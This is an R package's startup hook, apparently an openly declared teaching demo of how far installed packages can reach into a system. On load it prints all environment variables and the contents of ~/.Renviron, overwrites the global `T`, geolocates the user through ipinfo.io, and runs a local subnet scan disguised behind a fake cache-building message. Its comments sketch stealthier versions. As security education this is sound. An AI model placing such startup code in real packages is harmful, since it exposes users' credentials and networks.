psm <- packageStartupMessage
prmpt <- function(x="Hit Enter/Return to continue:") { if (interactive()) invisible(readline(prompt=x)) }
s_fromJSON <- purrr::safely(jsonlite::fromJSON)

T <- FALSE

.onAttach <- function(libname, pkgname) {

  if (!interactive()) return()

  psm("Hi. I'm a super-benignly-malicious R package! Nice to meet you.\n")
  psm("My goal is to help you understand what level of trust you're granting R packages.\n")

  psm("If you're in a private place and alone, hit Enter/Return to continue. Stop the program if you aren't. Potentially sensitive data is going to be displayed to the console.")

  prmpt()

  # TODO have to do this in a more stealthy manner for CRAN check posses
  assign("T", FALSE, envir=.GlobalEnv)

  psm("For starters, I've just assigned `T` to == 'FALSE'. I hope you don't use that terrible shorcut.\n")

  print(str(T))

  psm("Let's continue, shall we?")

  prmpt()

  psm("As a package, I have some serious access to your system.\n")

  print(Sys.getenv())

  psm("\nThose are all your environment variables. I hope they didn't have sensitive information (like API keys) in them since I just got access to them and, as you'll see in a bit, I can ship those anywhere I like.")

  prmpt()

  psm("I also have pretty broad filesystem access.\n")

  if (file.exists(path.expand("~/.Renviron"))) {
    psm("In fact, I can see everthing you can, like your .Renviron file that likely contains sensitive internal and external API credentials.\n")
    cat(paste0(readLines("~/.Renviron", warn=FALSE), collapse="\n"))
    psm("\n")
    prmpt()
  }

  # psm("\n\nThat was overt. I could have easily made it a heavily masked C-level call. Yes, you can execute custom C code on package startup:\n")
  #
  # print("=> EVENTUALLY THIS WILL CALL A C FUNCTION <=")
  #
  # prmpt()

  ip_info <- s_fromJSON("https://ipinfo.io/")
  if (!is.null(ip_info$result)) {
    psm("\nNow, I only imported [Rcpp, purrr, jsonlite]. Because 'jsonlite' is in there, I get stealthy-ish web access. I could get that with just 'download.file()', too, but you may not realize jsonlite imports httr+curl. That's a powerful toolbox for me.\n")
    print(str(ip_info$result))
    prmpt()
    psm("\nThat could have been a usage counter 'ping' to some server or I could have posted that sensitve .Renviron file somewhere. You'd likely not even notice the delay. I could have also posted that location info it retrieved somewhere or kept a package-level log of where you are everytime you use this package.\n")
  }

  # psm("TODO Again, in 'stealth mode', these overt R calls can be made using obfuscated C functions. Or even using functions embedded in R data files.\n")

  # NOTE keep this as the last test

  psm("This last one can take a while (it can be made faster and more stealthy, too). If you don't have ~1-2m to spare don't run it.\n")

  ok <- substr(trimws(tolower(prmpt("Enter 'y' to continue"))), 1, 1)
  if (ok == 'y') {

    psm("I'm going to generate a fake message about building a package metadata cache to cover the fact that I'm doing a local subnet scan. Gimme a cpl seconds...\n")

    res <- scanner()

    psm("\nThanks! I could have made that run both faster and in the background but this is an interactive teaching tool and you likely believe what packages tell you they're doing anyway. Let's see what you have on your network...\n")

    psm(res)
  } else {
    psm("Skipping last hack")
  }

}
